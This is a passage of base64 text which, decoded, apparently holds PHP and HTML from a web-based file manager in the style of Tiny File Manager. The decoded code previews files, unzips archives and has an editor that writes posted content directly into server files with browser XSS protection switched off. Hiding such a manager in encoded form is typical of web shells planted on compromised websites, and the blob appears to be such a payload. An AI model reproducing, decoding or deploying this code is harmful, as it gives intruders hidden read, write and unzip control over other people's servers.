NzPSJicmVhay13b3JkIj48Yj48P3BocCBlY2hvICR2aWV3X3RpdGxlID8+ICI8P3BocCBlY2hvIGZtX2VuYyhmbV9jb252ZXJ0X3dpbigkZmlsZSkpID8+IjwvYj48L3A+CiAgICAgICAgICAgICAgICA8cCBjbGFzcz0iYnJlYWstd29yZCI+CiAgICAgICAgICAgICAgICAgICAgRnVsbCBwYXRoOiA8P3BocCBlY2hvIGZtX2VuYyhmbV9jb252ZXJ0X3dpbigkZmlsZV9wYXRoKSkgPz48YnI+CiAgICAgICAgICAgICAgICAgICAgRmlsZQogICAgICAgICAgICAgICAgICAgIHNpemU6IDw/cGhwIGVjaG8gZm1fZ2V0X2ZpbGVzaXplKCRmaWxlc2l6ZSkgPz48P3BocCBpZiAoJGZpbGVzaXplID49IDEwMDApOiA/PiAoPD9waHAgZWNobyBzcHJpbnRmKCclcyBieXRlcycsICRmaWxlc2l6ZSkgPz4pPD9waHAgZW5kaWY7ID8+CiAgICAgICAgICAgICAgICAgICAgPGJyPgogICAgICAgICAgICAgICAgICAgIE1JTUUtdHlwZTogPD9waHAgZWNobyAkbWltZV90eXBlID8+PGJyPgogICAgICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgICAgICAgICAgLy8gWklQIGluZm8KICAgICAgICAgICAgICAgICAgICBpZiAoKCRpc196aXAgfHwgJGlzX2d6aXApICYmICRmaWxlbmFtZXMgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR0b3RhbF9maWxlcyA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICR0b3RhbF9jb21wID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgJHRvdGFsX3VuY29tcCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlbmFtZXMgYXMgJGZuKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoISRmblsnZm9sZGVyJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdG90YWxfZmlsZXMrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0b3RhbF9jb21wICs9ICRmblsnY29tcHJlc3NlZF9zaXplJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdG90YWxfdW5jb21wICs9ICRmblsnZmlsZXNpemUnXTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgICAgICAgICBGaWxlcyBpbiBhcmNoaXZlOiA8P3BocCBlY2hvICR0b3RhbF9maWxlcyA/Pjxicj4KICAgICAgICAgICAgICAgICAgICAgICAgVG90YWwgc2l6ZTogPD9waHAgZWNobyBmbV9nZXRfZmlsZXNpemUoJHRvdGFsX3VuY29tcCkgPz48YnI+CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgaW4gYXJjaGl2ZTogPD9waHAgZWNobyBmbV9nZXRfZmlsZXNpemUoJHRvdGFsX2NvbXApID8+PGJyPgogICAgICAgICAgICAgICAgICAgICAgICBDb21wcmVzc2lvbjogPD9waHAgZWNobyByb3VuZCgoJHRvdGFsX2NvbXAgLyAkdG90YWxfdW5jb21wKSAqIDEwMCkgPz4lPGJyPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAvLyBJbWFnZSBpbmZvCiAgICAgICAgICAgICAgICAgICAgaWYgKCRpc19pbWFnZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkaW1hZ2Vfc2l6ZSA9IGdldGltYWdlc2l6ZSgkZmlsZV9wYXRoKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnSW1hZ2Ugc2l6ZXM6ICcgLiAoaXNzZXQoJGltYWdlX3NpemVbMF0pID8gJGltYWdlX3NpemVbMF0gOiAnMCcpIC4gJyB4ICcgLiAoaXNzZXQoJGltYWdlX3NpemVbMV0pID8gJGltYWdlX3NpemVbMV0gOiAnMCcpIC4gJzxicj4nOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAvLyBUZXh0IGluZm8KICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3RleHQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGlzX3V0ZjggPSBmbV9pc191dGY4KCRjb250ZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnaWNvbnYnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkaXNfdXRmOCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb250ZW50ID0gaWNvbnYoRk1fSUNPTlZfSU5QVVRfRU5DLCAnVVRGLTgvL0lHTk9SRScsICRjb250ZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICdDaGFyc2V0OiAnIC4gKCRpc191dGY4ID8gJ3V0Zi04JyA6ICc4IGJpdCcpIC4gJzxicj4nOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2RsPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiI+PGkgY2xhc3M9ImZhIGZhLWNsb3VkLWRvd25sb2FkIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdEb3dubG9hZCcpID8+PC9hPjwvYj4gJm5ic3A7CiAgICAgICAgICAgICAgICAgICAgPGI+PGEgaHJlZj0iPD9waHAgZWNobyBmbV9lbmMoJGZpbGVfdXJsKSA/PiIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1leHRlcm5hbC1saW5rLXNxdWFyZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnT3BlbicpID8+PC9hPjwvYj4KICAgICAgICAgICAgICAgICAgICAmbmJzcDsKICAgICAgICAgICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgICAgIC8vIFpJUCBhY3Rpb25zCiAgICAgICAgICAgICAgICAgICAgaWYgKCFGTV9SRUFET05MWSAmJiAoJGlzX3ppcCB8fCAkaXNfZ3ppcCkgJiYgJGZpbGVuYW1lcyAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHppcF9uYW1lID0gcGF0aGluZm8oJGZpbGVfcGF0aCwgUEFUSElORk9fRklMRU5BTUUpOwogICAgICAgICAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7dW56aXA9PD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpID8+Ij48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdVblppcCcpID8+PC9hPjwvYj4gJm5ic3A7CiAgICAgICAgICAgICAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDt1bnppcD08P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZSkgPz4mYW1wO3RvZm9sZGVyPTEiIHRpdGxlPSJVblppcCB0byA8P3BocCBlY2hvIGZtX2VuYygkemlwX25hbWUpID8+Ij48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ1VuWmlwVG9Gb2xkZXInKSA/PjwvYT48L2I+ICZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3RleHQgJiYgIUZNX1JFQURPTkxZKSB7CiAgICAgICAgICAgICAgICAgICAgICAgID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDtlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiIgY2xhc3M9ImVkaXQtZmlsZSI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0VkaXQnKSA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPjwvYj4gJm5ic3A7CiAgICAgICAgICAgICAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+JmFtcDtlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiZlbnY9YWNlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iZWRpdC1maWxlIj48aSBjbGFzcz0iZmEgZmEtcGVuY2lsLXNxdWFyZS1vIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdBZHZhbmNlZEVkaXRvcicpID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+PC9iPiAmbm5ic3A7CiAgICAgICAgICAgICAgICAgICAgPD9waHAgfSA/PgogICAgICAgICAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+Ij48aSBjbGFzcz0iZmEgZmEtY2hldnJvbi1jaXJjbGUtbGVmdCBnby1iYWNrIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdCYWNrJykgPz48L2E+PC9iPgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPD9waHAKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkaXNfb25saW5lVmlld2VyKSB7CiAgICAgICAgICAgICAgICBpZigkb25saW5lX3ZpZXdlciA9PSAnZ29vZ2xlJykgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxpZnJhbWUgc3JjPSJodHRwczovL2RvY3MuZ29vZ2xlLmNvbS92aWV3ZXI/ZW1iZWRkZWQ9dHJ1ZSZobD1lbiZ1cmw9JyAuIGZtX2VuYygkZmlsZV91cmwpIC4gJyIgZnJhbWVib3JkZXI9Im5vIiBzdHlsZT0id2lkdGg6MTAwJTttaW4taGVpZ2h0OjQ2MHB4Ij48L2lmcmFtZT4nOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmKCRvbmxpbmVfdmlld2VyID09ICdtaWNyb3NvZnQnKSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGlmcmFtZSBzcmM9Imh0dHBzOi8vdmlldy5vZmZpY2VhcHBzLmxpdmUuY29tL29wL2VtYmVkLmFzcHg/c3JjPScgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICciIGZyYW1lYm9yZGVyPSJubyIgc3R5bGU9IndpZHRoOjEwMCU7bWluLWhlaWdodDo0NjBweCI+PC9pZnJhbWU+JzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlaWYgKCRpc196aXApIHsKICAgICAgICAgICAgICAgIC8vIFpJUCBjb250ZW50CiAgICAgICAgICAgICAgICBpZiAoJGZpbGVuYW1lcyAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICc8Y29kZSBjbGFzcz0ibWF4aGVpZ2h0Ij4nOwogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlbmFtZXMgYXMgJGZuKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZm5bJ2ZvbGRlciddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICc8Yj4nIC4gZm1fZW5jKCRmblsnbmFtZSddKSAuICc8L2I+PGJyPic7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICRmblsnbmFtZSddIC4gJyAoJyAuIGZtX2dldF9maWxlc2l6ZSgkZm5bJ2ZpbGVzaXplJ10pIC4gJyk8YnI+JzsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlY2hvICc8L2NvZGU+JzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPHA+RXJyb3Igd2hpbGUgZmV0Y2hpbmcgYXJjaGl2ZSBpbmZvPC9wPic7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZWlmICgkaXNfaW1hZ2UpIHsKICAgICAgICAgICAgICAgIC8vIEltYWdlIGNvbnRlbnQKICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheSgkZXh0LCBhcnJheSgnZ2lmJywgJ2pwZycsICdqcGVnJywgJ3BuZycsICdibXAnLCAnaWNvJywgJ3N2ZycpKSkgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxwPjxpbWcgc3JjPSInIC4gZm1fZW5jKCRmaWxlX3VybCkgLiAnIiBhbHQ9IiIgY2xhc3M9InByZXZpZXctaW1nIj48L3A+JzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlaWYgKCRpc19hdWRpbykgewogICAgICAgICAgICAgICAgLy8gQXVkaW8gY29udGVudAogICAgICAgICAgICAgICAgZWNobyAnPHA+PGF1ZGlvIHNyYz0iJyAuIGZtX2VuYygkZmlsZV91cmwpIC4gJyIgY29udHJvbHMgcHJlbG9hZD0ibWV0YWRhdGEiPjwvYXVkaW8+PC9wPic7CiAgICAgICAgICAgIH0gZWxzZWlmICgkaXNfdmlkZW8pIHsKICAgICAgICAgICAgICAgIC8vIFZpZGVvIGNvbnRlbnQKICAgICAgICAgICAgICAgIGVjaG8gJzxkaXYgY2xhc3M9InByZXZpZXctdmlkZW8iPjx2aWRlbyBzcmM9IicgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICciIHdpZHRoPSI2NDAiIGhlaWdodD0iMzYwIiBjb250cm9scyBwcmVsb2FkPSJtZXRhZGF0YSI+PC92aWRlbz48L2Rpdj4nOwogICAgICAgICAgICB9IGVsc2VpZiAoJGlzX3RleHQpIHsKICAgICAgICAgICAgICAgIGlmIChGTV9VU0VfSElHSExJR0hUSlMpIHsKICAgICAgICAgICAgICAgICAgICAvLyBoaWdobGlnaHQKICAgICAgICAgICAgICAgICAgICAkaGxqc19jbGFzc2VzID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICdzaHRtbCcgPT4gJ3htbCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdodGFjY2VzcycgPT4gJ2FwYWNoZScsCiAgICAgICAgICAgICAgICAgICAgICAgICdwaHRtbCcgPT4gJ3BocCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdsb2NrJyA9PiAnanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICdzdmcnID0+ICd4bWwnLAogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgJGhsanNfY2xhc3MgPSBpc3NldCgkaGxqc19jbGFzc2VzWyRleHRdKSA/ICdsYW5nLScgLiAkaGxqc19jbGFzc2VzWyRleHRdIDogJ2xhbmctJyAuICRleHQ7CiAgICAgICAgICAgICAgICAgICAgaWYgKGVtcHR5KCRleHQpIHx8IGluX2FycmF5KHN0cnRvbG93ZXIoJGZpbGUpLCBmbV9nZXRfdGV4dF9uYW1lcygpKSB8fCBwcmVnX21hdGNoKCcjXC5taW5cLihjc3N8anMpJCNpJywgJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRobGpzX2NsYXNzID0gJ25vaGlnaGxpZ2h0JzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSAnPHByZSBjbGFzcz0id2l0aC1obGpzIj48Y29kZSBjbGFzcz0iJyAuICRobGpzX2NsYXNzIC4gJyI+JyAuIGZtX2VuYygkY29udGVudCkgLiAnPC9jb2RlPjwvcHJlPic7CiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgYXJyYXkoJ3BocCcsICdwaHA0JywgJ3BocDUnLCAncGh0bWwnLCAncGhwcycpKSkgewogICAgICAgICAgICAgICAgICAgIC8vIHBocCBoaWdobGlnaHQKICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IGhpZ2hsaWdodF9zdHJpbmcoJGNvbnRlbnQsIHRydWUpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9ICc8cHJlPicgLiBmbV9lbmMoJGNvbnRlbnQpIC4gJzwvcHJlPic7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlY2hvICRjb250ZW50OwogICAgICAgICAgICB9CiAgICAgICAgICAgID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDw/cGhwCiAgICBpZighJHF1aWNrVmlldykgewogICAgICAgIGZtX3Nob3dfZm9vdGVyKCk7CiAgICB9CiAgICBleGl0Owp9CgovLyBmaWxlIGVkaXRvcgppZiAoaXNzZXQoJF9HRVRbJ2VkaXQnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ2VkaXQnXTsKICAgICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSwgZmFsc2UpOwogICAgJGZpbGUgPSBzdHJfcmVwbGFjZSgnLycsICcnLCAkZmlsZSk7CiAgICBpZiAoJGZpbGUgPT0gJycgfHwgIWlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsKICAgICAgICBmbV9zZXRfbXNnKCdGaWxlIG5vdCBmb3VuZCcsICdlcnJvcicpOwogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwogICAgfQogICAgaGVhZGVyKCdYLVhTUy1Qcm90ZWN0aW9uOjAnKTsKICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUgogICAgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgLy8gY3VycmVudCBwYXRoCgogICAgJGZpbGVfdXJsID0gRk1fUk9PVF9VUkwgLiBmbV9jb252ZXJ0X3dpbigoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZmlsZSk7CiAgICAkZmlsZV9wYXRoID0gJHBhdGggLiAnLycgLiAkZmlsZTsKCiAgICAvLyBub3JtYWwgZWRpdGVyCiAgICAkaXNOb3JtYWxFZGl0b3IgPSB0cnVlOwogICAgaWYgKGlzc2V0KCRfR0VUWydlbnYnXSkpIHsKICAgICAgICBpZiAoJF9HRVRbJ2VudiddID09ICJhY2UiKSB7CiAgICAgICAgICAgICRpc05vcm1hbEVkaXRvciA9IGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICAvLyBTYXZlIEZpbGUKICAgIGlmIChpc3NldCgkX1BPU1RbJ3NhdmVkYXRhJ10pKSB7CiAgICAgICAgJHdyaXRlZGF0YSA9ICRfUE9TVFsnc2F2ZWRhdGEnXTsKICAgICAgICAkZmQgPSBmb3BlbigkZmlsZV9wYXRoLCAidyIpOwogICAgICAgIEBmd3JpdGUoJGZkLCAkd3JpdGVkYXRhKTsKICAgICAgICBmY2xvc2UoJGZkKTsKICAgICAgICBmbV9zZXRfbXNnKCdGaWxlIFNhdmVkIFN1Y2Nlc3NmdWxseScpOwogICAgfQoKICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlX3BhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTikpOwogICAgJG1pbWVfdHlwZSA9IGZtX2dldF9taW1lX3R5cGUoJGZpbGVfcGF0aCk7CiAgICAkZmlsZXNpemUgPSBmaWxlc2l6ZSgkZmlsZV9wYXRoKTsKICAgICRpc190ZXh0ID0gZmFsc2U7CiAgICAkY29udGVudCA9ICcnOyAvLyBmb3IgdGV4dAoKICAgIGlmIChpbl9hcnJheSgkZXh0LCBmbV9nZXRfdGV4dF9leHRzKCkpIHx8IHN1YnN0cigkbWltZV90eXBlLCAwLCA0KSA9PSAndGV4dCcgfHwgaW5fYXJyYXkoJG1pbWVfdHlwZSwgZm1fZ2V0X3RleHRfbWltZXMoKSkpIHsKICAgICAgICAkaXNfdGV4dCA9IHRydWU7CiAgICAgICAgJGNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsKICAgIH0KCiAgICA/PgogICAgPGRpdiBjbGFzcz0icGF0aCI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS01IGNvbC1sZy02IHB0LTEiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYnRuLXRvb2xiYXIiIHJvbGU9InRvb2xiYXIiPgogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghJGlzTm9ybWFsRWRpdG9yKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBqcy1hY2UtdG9vbGJhciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJub25lIiBkYXRhLW9wdGlvbj0iZnVsbHNjcmVlbiIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLWZ1bGxzY3JlZW4iIHRpdGxlPSJGdWxsc2NyZWVuIj48aSBjbGFzcz0iZmEgZmEtZXhwYW5kIiB0aXRsZT0iRnVsbHNjcmVlbiI+PC9pPjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBkYXRhLWNtZD0iZmluZCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLXNlYXJjaCIgdGl0bGU9IlNlYXJjaCI+PGkgY2xhc3M9ImZhIGZhLXNlYXJjaCIgdGl0bGU9IlNlYXJjaCI+PC9pPjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBkYXRhLWNtZD0idW5kbyIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLXVuZG8iIHRpdGxlPSJVbmRvIj48aSBjbGFzcz0iZmEgZmEtdW5kbyIgdGl0bGU9IlVuZG8iPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gZGF0YS1jbWQ9InJlZG8iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXNlY29uZGFyeSIgaWQ9ImpzLWFjZS1yZWRvIiB0aXRsZT0iUmVkbyI+PGkgY2xhc3M9ImZhIGZhLXJlcGVhdCIgdGl0bGU9IlJlZG8iPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gZGF0YS1jbWQ9Im5vbmUiIGRhdGEtb3B0aW9uPSJ3cmFwIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1zZWNvbmRhcnkiIGlkPSJqcy1hY2Utd29yZFdyYXAiIHRpdGxlPSJXb3JkIFdyYXAiPjxpIGNsYXNzPSJmYSBmYS10ZXh0LXdpZHRoIiB0aXRsZT0iV29yZCBXcmFwIj48L2k+PC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJub25lIiBkYXRhLW9wdGlvbj0iaGVscCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLWdvTGluZSIgdGl0bGU9IkhlbHAiPjxpIGNsYXNzPSJmYSBmYS1xdWVzdGlvbiIgdGl0bGU9IkhlbHAiPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgaWQ9ImpzLWFjZS1tb2RlIiBkYXRhLXR5cGU9Im1vZGUiIHRpdGxlPSJTZWxlY3QgRG9jdW1lbnQgVHlwZSIgY2xhc3M9ImJ0bi1vdXRsaW5lLXNlY29uZGFyeSBib3JkZXItbGVmdC0wIGQtbm9uZSBkLW1kLWJsb2NrIj48b3B0aW9uPi0tIFNlbGVjdCBNb2RlIC0tPC9vcHRpb24+PC9zZWxlY3Q+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGlkPSJqcy1hY2UtdGhlbWUiIGRhdGEtdHlwZT0idGhlbWUiIHRpdGxlPSJTZWxlY3QgVGhlbWUiIGNsYXNzPSJidG4tb3V0bGluZS1zZWNvbmRhcnkgYm9yZGVyLWxlZnQtMCBkLW5vbmUgZC1sZy1ibG9jayI+PG9wdGlvbj4tLSBTZWxlY3QgVGhlbWUgLS08L29wdGlvbj48L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgaWQ9ImpzLWFjZS1mb250U2l6ZSIgZGF0YS10eXBlPSJmb250U2l6ZSIgdGl0bGU9IlNlbGN0IEZvbnQgU2l6ZSIgY2xhc3M9ImJ0bi1vdXRsaW5lLXNlY29uZGFyeSBib3JkZXItbGVmdC0wIGQtbm9uZSBkLWxnLWJsb2NrIj48b3B0aW9uPi0tIFNlbGVjdCBGb250IFNpemUgLS08L29wdGlvbj48L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgfSA/PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJlZGl0LWZpbGUtYWN0aW9ucyBjb2wteHMtMTIgY29sLXNtLTcgY29sLWxnLTYgdGV4dC1yaWdodCBwdC0xIj4KICAgICAgICAgICAgICAgIDxhIHRpdGxlPSJCYWNrIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1wcmltYXJ5IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEgpKSA/PiZhbXA7dmlldz08P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZSkgPz4iPjxpIGNsYXNzPSJmYSBmYS1yZXBseS1hbGwiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0JhY2snKSA/PjwvYT4KICAgICAgICAgICAgICAgIDxhIHRpdGxlPSJCYWNrdXAiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKTsiIG9uY2xpY2s9ImJhY2t1cCgnPD9waHAgZWNobyB1cmxlbmNvZGUodHJpbShGTV9QQVRIKSkgPz4nLCc8P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZSkgPz4nKSI+PGkgY2xhc3M9ImZhIGZhLWRhdGFiYXNlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdCYWNrVXAnKSA/PjwvYT4KICAgICAgICAgICAgICAgIDw/cGhwIGlmICgkaXNfdGV4dCkgeyA/PgogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICgkaXNOb3JtYWxFZGl0b3IpIHsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9IkFkdmFuY2VkIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1wcmltYXJ5IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEgpKSA/PiZhbXA7ZWRpdD08P3BocCBlY2hvIHVybGVuY29kZSgkZmlsZSkgPz4mYW1wO2Vudj1hY2UiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwtc3F1YXJlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ0FkdmFuY2VkRWRpdG9yJykgPz48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1wcmltYXJ5IG5hbWU9IlNhdmUiIGRhdGEtdXJsPSI8P3BocCBlY2hvIGZtX2VuYygkZmlsZV91cmwpID8+IiBvbmNsaWNrPSJlZGl0X3NhdmUodGhpcywnbnJsJykiPjxpIGNsYXNzPSJmYSBmYS1mbG9wcHktbyI+PC9pPiBTYXZlCiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDw/cGhwIH0gZWxzZSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSJQbGFpbiBFZGl0b3IiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpID8+